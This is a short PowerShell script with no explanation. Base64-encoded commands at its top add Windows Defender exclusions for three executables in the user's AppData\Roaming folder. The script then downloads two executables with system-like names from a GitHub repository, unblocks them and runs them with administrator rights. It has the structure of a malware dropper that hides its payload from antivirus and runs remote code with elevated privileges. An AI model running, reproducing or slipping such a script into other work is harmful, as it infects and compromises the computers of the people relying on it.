powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACIAJABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwAUwB1AGIAZABpAHIAXABXAGkAbgBkAG8AdwBzAC4AZQB4AGUAIgAgAC0ARgBvAHIAYwBlAA==
powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACIAJABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwAUwB1AGIAZABpAHIAXABXAGkAbgBkAG8AdwBzADMAMgAuAGUAeABlACIAIAAtAEYAbwByAGMAZQA=
powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACIAJABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwAVwBpAG4AZABvAHcAcwAzADIALgBlAHgAZQAiACAALQBGAG8AcgBjAGUA

# Download the files
Invoke-WebRequest -Uri "https://github.com/nomitaned/e/raw/refs/heads/main/Windows32.exe" -OutFile "$env:USERPROFILE\AppData\Roaming\Windows32.exe"
Invoke-WebRequest -Uri "https://github.com/nomitaned/e/raw/refs/heads/main/Windows.exe" -OutFile "$env:USERPROFILE\AppData\Roaming\Subdir\Windows.exe"

# Unblock the downloaded files
Unblock-File -Path "$env:USERPROFILE\AppData\Roaming\Windows32.exe"
Unblock-File -Path "$env:USERPROFILE\AppData\Roaming\Subdir\Windows.exe"

# Force Windows to recognize the new files
(New-Object -ComObject Shell.Application).Namespace("$env:USERPROFILE\AppData\Roaming").Self.InvokeVerb("Refresh")

# Add a short delay to allow Windows to process the files
Start-Sleep -Seconds 2

# Run the files
Start-Process "$env:USERPROFILE\Appdata\Roaming\Windows32.exe" -Wait -Verb RunAs
Start-Process "$env:USERPROFILE\Appdata\Roaming\Subdir\Windows.exe" -Wait -Verb RunAs
